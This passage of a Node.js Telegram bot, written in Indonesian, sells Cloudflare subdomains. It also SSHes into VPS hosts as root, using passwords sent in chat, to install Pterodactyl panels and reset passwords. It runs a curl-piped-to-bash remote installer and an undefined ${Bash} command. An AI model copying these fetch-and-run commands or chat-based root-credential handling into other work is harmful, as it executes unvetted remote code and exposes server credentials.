    return bot.sendMessage(chatId, `❌ IP tidak valid!\nContoh: 192.168.1.1`, {
      reply_to_message_id: messageId
    });
  }

  // Fungsi tambah subdomain
  async function subDomain1(host, ip) {
    try {
      const Zonetld = setting.zonetld1;
      const Apitokentld = setting.apitokentld1;
      const Domaintld = setting.domaintld1;

      const response = await axios.post(
        `https://api.cloudflare.com/client/v4/zones/${Zonetld}/dns_records`,
        {
          type: "A",
          name: `${host}.${Domaintld}`,
          content: ip,
          ttl: 3600,
          priority: 10,
          proxied: false
        },
        {
          headers: {
            Authorization: `Bearer ${Apitokentld}`,
            "Content-Type": "application/json"
          }
        }
      );

      const res = response.data;
      if (res.success) {
        return { success: true, name: res.result?.name, ip: res.result?.content };
      } else {
        return { success: false, error: JSON.stringify(res.errors) };
      }
    } catch (error) {
      const errMsg = error.response?.data?.errors?.[0]?.message || error.message || 'Unknown Error';
      return { success: false, error: errMsg };
    }
  }

  // Jalankan proses
  const processingMsg = await bot.sendMessage(chatId, `⏳ Sedang menambahkan subdomain...`, {
    reply_to_message_id: messageId
  });

  const result = await subDomain1(host, ip);

  if (result.success) {
    await bot.sendMessage(chatId, `✅ Berhasil membuat subdomain:\n\n🌐 Hostname: ${result.name}\n📌 IP: ${result.ip}`, {
      reply_to_message_id: messageId
    });
  } else {
    await bot.sendMessage(chatId, `❌ Gagal membuat subdomain!\nError: ${result.error}`, {
      reply_to_message_id: messageId
    });
  }
});

bot.onText(/^\/domain2(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const messageId = msg.message_id;
  const reply = msg.reply_to_message;

  // Cek user Premium
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Maaf, perintah ini hanya untuk pengguna *Premium Seller Domain*.`, {
      reply_to_message_id: messageId,
      parse_mode: 'Markdown'
    });
  }

  // Ambil teks argumen
  const rawInput = match[1] || (reply && reply.text);
  if (!rawInput) {
    return bot.sendMessage(chatId, `Format salah!\nContoh: /domain2 hostname|167.29.379.23`, {
      reply_to_message_id: messageId
    });
  }

  const [hostRaw, ipRaw] = rawInput.split('|').map(s => s.trim());

  // Validasi host
  const host = (hostRaw || '').replace(/[^a-z0-9.-]/gi, '');
  if (!host) {
    return bot.sendMessage(chatId, `❌ Host tidak valid!\nGunakan huruf, angka, strip (-), atau titik (.)`, {
      reply_to_message_id: messageId
    });
  }

  // Validasi IP
  const ip = (ipRaw || '').replace(/[^0-9.]/gi, '');
  if (!ip || ip.split('.').length !== 4) {
    return bot.sendMessage(chatId, `❌ IP tidak valid!\nContoh: 192.168.0.1`, {
      reply_to_message_id: messageId
    });
  }

  // Fungsi tambah subdomain
  async function subDomain1(host, ip) {
    try {
      const Zonetld = setting.zonetld2;
      const Apitokentld = setting.apitokentld2;
      const Domaintld = setting.domaintld2;

      const response = await axios.post(
        `https://api.cloudflare.com/client/v4/zones/${Zonetld}/dns_records`,
        {
          type: "A",
          name: `${host}.${Domaintld}`,
          content: ip,
          ttl: 3600,
          priority: 10,
          proxied: false
        },
        {
          headers: {
            Authorization: `Bearer ${Apitokentld}`,
            "Content-Type": "application/json"
          }
        }
      );

      const res = response.data;
      if (res.success) {
        return { success: true, name: res.result?.name, ip: res.result?.content };
      } else {
        return { success: false, error: JSON.stringify(res.errors) };
      }
    } catch (error) {
      const errMsg = error.response?.data?.errors?.[0]?.message || error.message || 'Unknown Error';
      return { success: false, error: errMsg };
    }
  }

  // Jalankan proses
  const processingMsg = await bot.sendMessage(chatId, `⏳ Sedang menambahkan subdomain...`, {
    reply_to_message_id: messageId
  });

  const result = await subDomain1(host, ip);

  if (result.success) {
    await bot.sendMessage(chatId, `✅ Berhasil membuat subdomain:\n\n🌐 Hostname: ${result.name}\n📌 IP: ${result.ip}`, {
      reply_to_message_id: messageId
    });
  } else {
    await bot.sendMessage(chatId, `❌ Gagal membuat subdomain!\nError: ${result.error}`, {
      reply_to_message_id: messageId
    });
  }
});

bot.onText(/^\/domain3(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const messageId = msg.message_id;
  const reply = msg.reply_to_message;

  // Cek user Premium
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Maaf, perintah ini hanya untuk pengguna *Premium Seller Domain*.`, {
      reply_to_message_id: messageId,
      parse_mode: 'Markdown'
    });
  }

  // Ambil teks argumen
  const rawInput = match[1] || (reply && reply.text);
  if (!rawInput) {
    return bot.sendMessage(chatId, `Format salah!\nContoh: /domain3 hostname|167.29.379.23`, {
      reply_to_message_id: messageId
    });
  }

  const [hostRaw, ipRaw] = rawInput.split('|').map(s => s.trim());

  // Validasi host
  const host = (hostRaw || '').replace(/[^a-z0-9.-]/gi, '');
  if (!host) {
    return bot.sendMessage(chatId, `❌ Host tidak valid!\nGunakan huruf, angka, strip (-), atau titik (.)`, {
      reply_to_message_id: messageId
    });
  }

  // Validasi IP
  const ip = (ipRaw || '').replace(/[^0-9.]/gi, '');
  if (!ip || ip.split('.').length !== 4) {
    return bot.sendMessage(chatId, `❌ IP tidak valid!\nContoh: 192.168.0.1`, {
      reply_to_message_id: messageId
    });
  }

  // Fungsi tambah subdomain
  async function subDomain1(host, ip) {
    try {
      const Zonetld = setting.zonetld3;
      const Apitokentld = setting.apitokentld3;
      const Domaintld = setting.domaintld3;

      const response = await axios.post(
        `https://api.cloudflare.com/client/v4/zones/${Zonetld}/dns_records`,
        {
          type: "A",
          name: `${host}.${Domaintld}`,
          content: ip,
          ttl: 3600,
          priority: 10,
          proxied: false
        },
        {
          headers: {
            Authorization: `Bearer ${Apitokentld}`,
            "Content-Type": "application/json"
          }
        }
      );

      const res = response.data;
      if (res.success) {
        return { success: true, name: res.result?.name, ip: res.result?.content };
      } else {
        return { success: false, error: JSON.stringify(res.errors) };
      }
    } catch (error) {
      const errMsg = error.response?.data?.errors?.[0]?.message || error.message || 'Unknown Error';
      return { success: false, error: errMsg };
    }
  }

  // Jalankan proses
  const processingMsg = await bot.sendMessage(chatId, `⏳ Sedang menambahkan subdomain...`, {
    reply_to_message_id: messageId
  });

  const result = await subDomain1(host, ip);

  if (result.success) {
    await bot.sendMessage(chatId, `✅ Berhasil membuat subdomain:\n\n🌐 Hostname: ${result.name}\n📌 IP: ${result.ip}`, {
      reply_to_message_id: messageId
    });
  } else {
    await bot.sendMessage(chatId, `❌ Gagal membuat subdomain!\nError: ${result.error}`, {
      reply_to_message_id: messageId
    });
  }
});

bot.onText(/^\/domain4(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const messageId = msg.message_id;
  const reply = msg.reply_to_message;

  // Cek user Premium
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Maaf, perintah ini hanya untuk pengguna *Premium Seller Domain*.`, {
      reply_to_message_id: messageId,
      parse_mode: 'Markdown'
    });
  }

  // Ambil teks argumen
  const rawInput = match[1] || (reply && reply.text);
  if (!rawInput) {
    return bot.sendMessage(chatId, `Format salah!\nContoh: /domain4 hostname|167.29.379.23`, {
      reply_to_message_id: messageId
    });
  }

  const [hostRaw, ipRaw] = rawInput.split('|').map(s => s.trim());

  // Validasi host
  const host = (hostRaw || '').replace(/[^a-z0-9.-]/gi, '');
  if (!host) {
    return bot.sendMessage(chatId, `❌ Host tidak valid!\nGunakan huruf, angka, strip (-), atau titik (.)`, {
      reply_to_message_id: messageId
    });
  }

  // Validasi IP
  const ip = (ipRaw || '').replace(/[^0-9.]/gi, '');
  if (!ip || ip.split('.').length !== 4) {
    return bot.sendMessage(chatId, `❌ IP tidak valid!\nContoh: 192.168.0.1`, {
      reply_to_message_id: messageId
    });
  }

  // Fungsi tambah subdomain
  async function subDomain1(host, ip) {
    try {
      const Zonetld = setting.zonetld4;
      const Apitokentld = setting.apitokentld4;
      const Domaintld = setting.domaintld4;

      const response = await axios.post(
        `https://api.cloudflare.com/client/v4/zones/${Zonetld}/dns_records`,
        {
          type: "A",
          name: `${host}.${Domaintld}`,
          content: ip,
          ttl: 3600,
          priority: 10,
          proxied: false
        },
        {
          headers: {
            Authorization: `Bearer ${Apitokentld}`,
            "Content-Type": "application/json"
          }
        }
      );

      const res = response.data;
      if (res.success) {
        return { success: true, name: res.result?.name, ip: res.result?.content };
      } else {
        return { success: false, error: JSON.stringify(res.errors) };
      }
    } catch (error) {
      const errMsg = error.response?.data?.errors?.[0]?.message || error.message || 'Unknown Error';
      return { success: false, error: errMsg };
    }
  }

  // Jalankan proses
  const processingMsg = await bot.sendMessage(chatId, `⏳ Sedang menambahkan subdomain...`, {
    reply_to_message_id: messageId
  });

  const result = await subDomain1(host, ip);

  if (result.success) {
    await bot.sendMessage(chatId, `✅ Berhasil membuat subdomain:\n\n🌐 Hostname: ${result.name}\n📌 IP: ${result.ip}`, {
      reply_to_message_id: messageId
    });
  } else {
    await bot.sendMessage(chatId, `❌ Gagal membuat subdomain!\nError: ${result.error}`, {
      reply_to_message_id: messageId
    });
  }
});

bot.onText(/^\/domain5(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const messageId = msg.message_id;
  const reply = msg.reply_to_message;

  // Cek user Premium
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Maaf, perintah ini hanya untuk pengguna *Premium Seller Domain*.`, {
      reply_to_message_id: messageId,
      parse_mode: 'Markdown'
    });
  }

  // Ambil teks argumen
  const rawInput = match[1] || (reply && reply.text);
  if (!rawInput) {
    return bot.sendMessage(chatId, `Format salah!\nContoh: /domain4 hostname|167.29.379.23`, {
      reply_to_message_id: messageId
    });
  }

  const [hostRaw, ipRaw] = rawInput.split('|').map(s => s.trim());

  // Validasi host
  const host = (hostRaw || '').replace(/[^a-z0-9.-]/gi, '');
  if (!host) {
    return bot.sendMessage(chatId, `❌ Host tidak valid!\nGunakan huruf, angka, strip (-), atau titik (.)`, {
      reply_to_message_id: messageId
    });
  }

  // Validasi IP
  const ip = (ipRaw || '').replace(/[^0-9.]/gi, '');
  if (!ip || ip.split('.').length !== 4) {
    return bot.sendMessage(chatId, `❌ IP tidak valid!\nContoh: 192.168.0.1`, {
      reply_to_message_id: messageId
    });
  }

  // Fungsi tambah subdomain
  async function subDomain1(host, ip) {
    try {
      const Zonetld = setting.zonetld5;
      const Apitokentld = setting.apitokentld5;
      const Domaintld = setting.domaintld5;

      const response = await axios.post(
        `https://api.cloudflare.com/client/v4/zones/${Zonetld}/dns_records`,
        {
          type: "A",
          name: `${host}.${Domaintld}`,
          content: ip,
          ttl: 3600,
          priority: 10,
          proxied: false
        },
        {
          headers: {
            Authorization: `Bearer ${Apitokentld}`,
            "Content-Type": "application/json"
          }
        }
      );

      const res = response.data;
      if (res.success) {
        return { success: true, name: res.result?.name, ip: res.result?.content };
      } else {
        return { success: false, error: JSON.stringify(res.errors) };
      }
    } catch (error) {
      const errMsg = error.response?.data?.errors?.[0]?.message || error.message || 'Unknown Error';
      return { success: false, error: errMsg };
    }
  }

  // Jalankan proses
  const processingMsg = await bot.sendMessage(chatId, `⏳ Sedang menambahkan subdomain...`, {
    reply_to_message_id: messageId
  });

  const result = await subDomain1(host, ip);

  if (result.success) {
    await bot.sendMessage(chatId, `✅ Berhasil membuat subdomain:\n\n🌐 Hostname: ${result.name}\n📌 IP: ${result.ip}`, {
      reply_to_message_id: messageId
    });
  } else {
    await bot.sendMessage(chatId, `❌ Gagal membuat subdomain!\nError: ${result.error}`, {
      reply_to_message_id: messageId
    });
  }
});

bot.onText(/^\/domain6(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const messageId = msg.message_id;
  const reply = msg.reply_to_message;

  // Cek user Premium
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Maaf, perintah ini hanya untuk pengguna *Premium Seller Domain*.`, {
      reply_to_message_id: messageId,
      parse_mode: 'Markdown'
    });
  }

  // Ambil teks argumen
  const rawInput = match[1] || (reply && reply.text);
  if (!rawInput) {
    return bot.sendMessage(chatId, `Format salah!\nContoh: /domain4 hostname|167.29.379.23`, {
      reply_to_message_id: messageId
    });
  }

  const [hostRaw, ipRaw] = rawInput.split('|').map(s => s.trim());

  // Validasi host
  const host = (hostRaw || '').replace(/[^a-z0-9.-]/gi, '');
  if (!host) {
    return bot.sendMessage(chatId, `❌ Host tidak valid!\nGunakan huruf, angka, strip (-), atau titik (.)`, {
      reply_to_message_id: messageId
    });
  }

  // Validasi IP
  const ip = (ipRaw || '').replace(/[^0-9.]/gi, '');
  if (!ip || ip.split('.').length !== 4) {
    return bot.sendMessage(chatId, `❌ IP tidak valid!\nContoh: 192.168.0.1`, {
      reply_to_message_id: messageId
    });
  }

  // Fungsi tambah subdomain
  async function subDomain1(host, ip) {
    try {
      const Zonetld = setting.zonetld6;
      const Apitokentld = setting.apitokentld6;
      const Domaintld = setting.domaintld6;

      const response = await axios.post(
        `https://api.cloudflare.com/client/v4/zones/${Zonetld}/dns_records`,
        {
          type: "A",
          name: `${host}.${Domaintld}`,
          content: ip,
          ttl: 3600,
          priority: 10,
          proxied: false
        },
        {
          headers: {
            Authorization: `Bearer ${Apitokentld}`,
            "Content-Type": "application/json"
          }
        }
      );

      const res = response.data;
      if (res.success) {
        return { success: true, name: res.result?.name, ip: res.result?.content };
      } else {
        return { success: false, error: JSON.stringify(res.errors) };
      }
    } catch (error) {
      const errMsg = error.response?.data?.errors?.[0]?.message || error.message || 'Unknown Error';
      return { success: false, error: errMsg };
    }
  }

  // Jalankan proses
  const processingMsg = await bot.sendMessage(chatId, `⏳ Sedang menambahkan subdomain...`, {
    reply_to_message_id: messageId
  });

  const result = await subDomain1(host, ip);

  if (result.success) {
    await bot.sendMessage(chatId, `✅ Berhasil membuat subdomain:\n\n🌐 Hostname: ${result.name}\n📌 IP: ${result.ip}`, {
      reply_to_message_id: messageId
    });
  } else {
    await bot.sendMessage(chatId, `❌ Gagal membuat subdomain!\nError: ${result.error}`, {
      reply_to_message_id: messageId
    });
  }
});

// ─── /installpanel1 ────────────────────
bot.onText(/^(\.|\#|\/)installpanel1$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const reply = msg.reply_to_message;
    const targetMessageId = reply ? reply.message_id : msg.message_id;
      // Cek Apakah User Owner
      if (userId !== owner) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang dapat menggunakan perintah ini.", {
      reply_to_message_id: targetMessageId,
      reply_markup: {
        inline_keyboard: [
          [{ text: "HUBUNGI ADMIN", url: "https://t.me/yamzzzx" }]
        ]
      }
    });
  }
    
    bot.sendMessage(
        chatId,
        `⚠️ Format salah!\nPenggunaan: /installpanel1 ipvps,password,domainpnl,domainnode,ramvps ( contoh : 8000 = ram 8 )`,
        { reply_to_message_id: targetMessageId } // Balas pesan target yang telah ditentukan
    );
});

bot.onText(/\/installpanel1 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const t = text.split(',');

  if (!owner.includes(String(msg.from.id))) {
    return bot.sendMessage(chatId, '❌ Fitur Ini Khusus Owner Saya!!!');
  }

  if (t.length < 5) {
    return bot.sendMessage(chatId, '*Format salah!*\nPenggunaan: /installpanel1 ipvps,password,domainpnl,domainnode,ramvps\nContoh: /installpanel1 192.168.1.1,rootpass,sub.domain.com,node.domain.com,8000');
  }

  const [ipvps, passwd, subdomain, domainnode, ramvps] = t;
  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };

  let password = generateRandomPassword();
  const command = 'bash <(curl -s https://pterodactyl-installer.se)';
  const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
  const conn = new Client();

  conn.on('ready', () => {
    bot.sendMessage(chatId, `PROSES PENGINSTALLAN SEDANG BERLANGSUNG MOHON TUNGGU 5-10 MENIT`);
    conn.exec(command, (err, stream) => {
      if (err) throw err;

      stream.on('close', (code, signal) => {
        installWings(conn, domainnode, subdomain, password, ramvps);
      }).on('data', (data) => {
        handlePanelInstallationInput(data, stream, subdomain, password);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }).connect(connSettings);

  function installWings(conn, domainnode, subdomain, password, ramvps) {
    bot.sendMessage(chatId, `PROSES PENGINSTALLAN WINGS SEDANG BERLANGSUNG MOHON TUNGGU 5 MENIT`);
    conn.exec(commandWings, (err, stream) => {
      if (err) throw err;

      stream.on('close', (code, signal) => {
        createNode(conn, domainnode, ramvps, subdomain, password);
      }).on('data', (data) => {
        handleWingsInstallationInput(data, stream, domainnode, subdomain);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }

  function createNode(conn, domainnode, ramvps, subdomain, password) {
    const command = `${Bash}`;
    bot.sendMessage(chatId, `MEMULAI CREATE NODE & LOCATION`);
    conn.exec(command, (err, stream) => {
      if (err) throw err;

      stream.on('close', (code, signal) => {
        conn.end();
        sendPanelData(subdomain, password);
      }).on('data', (data) => {
        handleNodeCreationInput(data, stream, domainnode, ramvps);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }

  function sendPanelData(subdomain, password) {
    bot.sendMessage(chatId, `*DATA PANEL ANDA*\n\nUSERNAME: admin\nPASSWORD: ${password}\nLOGIN: ${subdomain}\n\nNote: Semua Instalasi Telah Selesai.\nSilahkan Create Allocation Di Node Yang Dibuat Oleh Bot, Ambil Token Configuration, dan ketik *.startwings (token)*\n\nNote: HARAP TUNGGU 1-5 MENIT AGAR WEB DAPAT DIAKSES\n_Script by @yamzzzx`);
  }

  function handlePanelInstallationInput(data, stream, subdomain, password) {
    const inputs = [
      '0', '', '', '1248', 'Asia/Jakarta', 'admin@gmail.com', 'admin@gmail.com',
      'admin', 'adm', 'adm', `${password}`, `${subdomain}`,
      'y', 'y', 'y', 'y', 'yes', 'A', '', '1'
    ];
    if (data.toString().includes('Input') || data.toString().includes('Please read the Terms of Service')) {
      stream.write(inputs.shift() + '\n');
    }
    console.log('STDOUT:', data.toString());
  }

  function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
    const inputs = [
      '1', 'y', 'y', 'y', `${subdomain}`, 'y', 'user', '1248',
      'y', `${domainnode}`, 'y', 'admin@gmail.com', 'y'
    ];
    if (data.toString().includes('Input')) {
      stream.write(inputs.shift() + '\n');
    }
    console.log('STDOUT:', data.toString());
  }

  function handleNodeCreationInput(data, stream, domainnode, ramvps) {
    const inputs = [
      `${Tokeninstall}`, '4', 'SGP', 'Jangan Lupa Support yamzzzx🦅🇮🇩',
      `${domainnode}`, 'NODES', `${ramvps}`, `${ramvps}`, '1'
    ];
    inputs.forEach(i => stream.write(i + '\n'));
    console.log('STDOUT:', data.toString());
  }
});

// ─── /installpanel2 ────────────────────
bot.onText(/^(\.|\#|\/)installpanel2$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const reply = msg.reply_to_message;
    const targetMessageId = reply ? reply.message_id : msg.message_id;
      // Cek Apakah User Owner
      if (userId !== owner) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang dapat menggunakan perintah ini.", {
      reply_to_message_id: targetMessageId,
      reply_markup: {
        inline_keyboard: [
          [{ text: "HUBUNGI ADMIN", url: "https://t.me/yamzzzx" }]
        ]
      }
    });
  }
    
    bot.sendMessage(
        chatId,
        `⚠️ Format salah!\nPenggunaan: /installpanel2 ipvps,password,domainpnl,domainnode,ramvps ( contoh : 8000 = ram 8 )`,
        { reply_to_message_id: targetMessageId } // Balas pesan target yang telah ditentukan
    );
});

bot.onText(/\/installpanel2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const t = text.split(',');

  if (!owner.includes(String(msg.from.id))) {
    return bot.sendMessage(chatId, '❌ Fitur Ini Khusus Owner Saya!!!');
  }

  if (t.length < 5) {
    return bot.sendMessage(chatId, 'Format salah!\nPenggunaan: /installpanel2 ipvps,password,domainpnl,domainnode,ramvps (contoh: 8000 = ram 8GB)');
  }

  const [ipvps, passwd, subdomain, domainnode, ramvps] = t;
  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };

  const password = generateRandomPassword();
  const command = 'bash <(curl -s https://pterodactyl-installer.se)';
  const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
  const conn = new Client();

  conn.on('ready', () => {
    bot.sendMessage(chatId, `🚀 PROSES INSTALL PANEL SEDANG BERLANGSUNG, MOHON TUNGGU 5-10 MENIT`);
    conn.exec(command, (err, stream) => {
      if (err) throw err;

      stream.on('close', (code, signal) => {
        console.log(`Panel install stream closed: ${code}, ${signal}`);
        installWings(conn, domainnode, subdomain, password, ramvps);
      }).on('data', (data) => {
        handlePanelInstallationInput(data, stream, subdomain, password);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }).connect(connSettings);

  function installWings(conn, domainnode, subdomain, password, ramvps) {
    bot.sendMessage(chatId, `🛠️ PROSES INSTALL WINGS, MOHON TUNGGU 5 MENIT`);
    conn.exec(commandWings, (err, stream) => {
      if (err) throw err;

      stream.on('close', (code, signal) => {
        console.log(`Wings install stream closed: ${code}, ${signal}`);
        createNode(conn, domainnode, ramvps, subdomain, password);
      }).on('data', (data) => {
        handleWingsInstallationInput(data, stream, domainnode, subdomain);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }

  function createNode(conn, domainnode, ramvps, subdomain, password) {
    const command = `${Bash}`; // pastikan variabel Bash terdefinisi atau diubah sesuai kebutuhan
    bot.sendMessage(chatId, `📡 MEMULAI CREATE NODE & LOCATION`);

    conn.exec(command, (err, stream) => {
      if (err) throw err;

      stream.on('close', (code, signal) => {
        console.log(`Node creation stream closed: ${code}, ${signal}`);
        conn.end();
        sendPanelData(subdomain, password);
      }).on('data', (data) => {
        handleNodeCreationInput(data, stream, domainnode, ramvps);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }

  function sendPanelData(subdomain, password) {
    bot.sendMessage(chatId, `✅ *DATA PANEL ANDA*\n\n👤 USERNAME: admin\n🔒 PASSWORD: ${password}\n🌐 LOGIN: ${subdomain}\n\n📌 Note: Semua Instalasi Telah Selesai. Silakan create allocation di node yang dibuat oleh bot dan ambil token configuration, lalu ketik /startwings (token)\n🕐 Tunggu 1-5 menit sebelum web bisa diakses.`);
  }

  function handlePanelInstallationInput(data, stream, subdomain, password) {
    const str = data.toString();
    if (str.includes('Input')) {
      stream.write('0\n\n\n1248\nAsia/Jakarta\nadmin@gmail.com\nadmin@gmail.com\nadmin\nadm\nadm\n');
      stream.write(`${password}\n`);
      stream.write(`${subdomain}\n`);
      stream.write('y\ny\ny\ny\ny\n\n1\n');
    }
    if (str.includes('Please read the Terms of Service')) {
      stream.write('Y\n');
    }
    console.log('Panel STDOUT:', str);
  }

  function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
    const str = data.toString();
    if (str.includes('Input')) {
      stream.write('1\ny\ny\ny\n');
      stream.write(`${subdomain}\n`);
      stream.write('y\nuser\n1248\ny\n');
      stream.write(`${domainnode}\n`);
      stream.write('y\nadmin@gmail.com\ny\n');
    }
    console.log('Wings STDOUT:', str);
  }

  function handleNodeCreationInput(data, stream, domainnode, ramvps) {
    stream.write(`${Tokeninstall}\n4\nSGP\nJangan Lupa Support yamzzzx🦅🇮🇩\n`);
    stream.write(`${domainnode}\nNODES\n${ramvps}\n${ramvps}\n1\n`);
    console.log('Node STDOUT:', data.toString());
  }
});

// ─── /installwings ────────────────────
bot.onText(/^(\.|\#|\/)installwings\s(.+)$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const text = match[2];
    const reply = msg.reply_to_message;

    if (userId !== owner) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang dapat menggunakan perintah ini.", {
      reply_to_message_id: reply?.message_id || msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "HUBUNGI ADMIN", url: "https://t.me/yamzzzx" }]
        ]
      }
    });
  }

    let t = text.split(',');
    if (t.length < 3) {
        return bot.sendMessage(chatId, `*Format salah!*\nPenggunaan: /installwings ipvps,password,token (token configuration)`, { parse_mode: 'Markdown' });
    }

    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    let token = t[2].trim();

    const connSettings = {
        host: ipvps,
        port: 22,
        username: 'root',
        password: passwd
    };

    const conn = new Client();

    conn.on('ready', () => {
        bot.sendMessage(chatId, '𝗣𝗥𝗢𝗦𝗘𝗦 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗘 𝗪𝗜𝗡𝗚𝗦');

        conn.exec(Bash, (err, stream) => {
            if (err) {
                bot.sendMessage(chatId, `❌ Terjadi error saat eksekusi command`);
                return conn.end();
            }

            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                bot.sendMessage(chatId, '𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗧𝗔𝗥𝗧 𝗪𝗜𝗡𝗚𝗦 𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗖𝗘𝗞 𝗡𝗢𝗗𝗘 𝗔𝗡𝗗𝗔😁');
                conn.end();
            }).on('data', (data) => {
                stream.write(`${Tokeninstall}\n`);
                stream.write('3\n');
                stream.write(`${token}\n`);
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        bot.sendMessage(chatId, '❌ Katasandi atau IP tidak valid!');
    }).connect(connSettings);
});

// ─── /restartpwvps ────────────────────
bot.onText(/^(\.|\#|\/)resetpwvps(?:\s+(.+))?$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const reply = msg.reply_to_message;
    const targetMessageId = reply ? reply.message_id : msg.message_id;
    const input = match[2]; // isi setelah command

    // Cek Owner
    if (userId !== owner) {
        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang dapat menggunakan perintah ini.", {
            reply_to_message_id: targetMessageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "HUBUNGI ADMIN", url: "https://t.me/yamzzzx" }]
                ]
            }
        });
    }

    // Validasi input
    if (!input || input.split('|').length < 3) {
        return bot.sendMessage(
            chatId,
            `⚠️ Format salah!\nPenggunaan: /resetpwvps ipvps|passwordlama|passwordbaru`,
            { reply_to_message_id: targetMessageId }
        );
    }

    // Pisahkan data input
    const [ipvps, oldPass, newPass] = input.split('|');

    const connSettings = {
        host: ipvps,
        port: 22,
        username: 'root',
        password: oldPass
    };

    const connCommand = `${Bash}`; // pastikan sudah ada global.bash di setting
    const conn = new Client();

    // Fungsi waktu WIB
    const getWIBTime = () => {
        const date = new Date();
        const options = { timeZone: 'Asia/Jakarta', hour12: false };
        return date.toLocaleString('id-ID', options);
    };

    const startTime = getWIBTime();

    bot.sendMessage(chatId, `🔐 *Mengubah Password VPS Dimulai...*\n⏰ Waktu Mulai: ${startTime}`, {
        reply_to_message_id: targetMessageId,
        parse_mode: "Markdown"
    });

    conn.on('ready', () => {
        conn.exec(connCommand, (err, stream) => {
            if (err) throw err;

            stream.on('close', (code, signal) => {
                const endTime = getWIBTime();
                bot.sendMessage(chatId,
                    `✅ *Password VPS Berhasil Diubah!*\n\n📋 *Detail VPS:*\n- 🌐 IP VPS: ${ipvps}\n- 🔑 Password Baru: ${newPass}\n\n⏰ *Waktu Proses:*\n- Mulai: ${startTime}\n- Selesai: ${endTime}\n\n💡 *Catatan:* Simpan data ini dengan baik.`,
                    { parse_mode: "Markdown" }
                );
                conn.end();
            }).on('data', (data) => {
                stream.write(`${Tokeninstall}\n`);
                stream.write('8\n');
                stream.write(`${newPass}\n`);
                stream.write(`${newPass}\n`);
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        bot.sendMessage(chatId, '❌ *IP atau Password Salah!*', { parse_mode: "Markdown" });
    }).connect(connSettings);
});

// ✅ daftar paket panel
const paket = {
  "1gb": { size: "1GB", price: 1000 },
  "2gb": { size: "2GB", price: 2000 },
  "3gb": { size: "3GB", price: 3000 },
  "4gb": { size: "4GB", price: 4000 },
  "unli": { size: "UNLI", price: 5000 }
};

// ✅ daftar size panel
const sizes = {
      '1gb': { memory: '1024', disk: '1024', cpu: '30' },
      '2gb': { memory: '2048', disk: '2048', cpu: '40' },
      '3gb': { memory: '3072', disk: '3072', cpu: '50' },
      '4gb': { memory: '4096', disk: '4096', cpu: '60' },
      'unli': { memory: '0', disk: '0', cpu: '0' }
    };

  // ─── /buypanel otomatis ────────────────────
bot.onText(/^([./]{0,2})?buypanel\s*(\d+)?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const username = msg.from.username || msg.from.first_name;

  // ✅ Cek transaksi aktif
  if (activeDeposit[userId]) {
    return bot.sendMessage(chatId, "❗ Masih ada transaksi aktif.\nKetik *.batalbeli* untuk membatalkan.");
  }

  const paketList = `
🛒 *PANEL PRIVATE yamzzzx STORE* 🛒

Silakan pilih paket panel:
